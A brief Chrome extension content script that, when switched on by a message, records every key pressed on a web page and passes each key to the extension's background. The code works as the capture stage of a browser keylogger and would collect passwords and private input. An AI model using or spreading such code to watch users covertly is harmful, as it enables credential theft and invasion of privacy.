let isSaveKeystrokes = false;
let keystrokes = '';

chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    if (message.saveKeystrokes !== undefined) {
        isSaveKeystrokes = message.saveKeystrokes;
    }
});

document.addEventListener('keydown', function (event) {
    if (isSaveKeystrokes) {
        keystrokes += event.key;
        chrome.runtime.sendMessage({ key: event.key });
    }
});
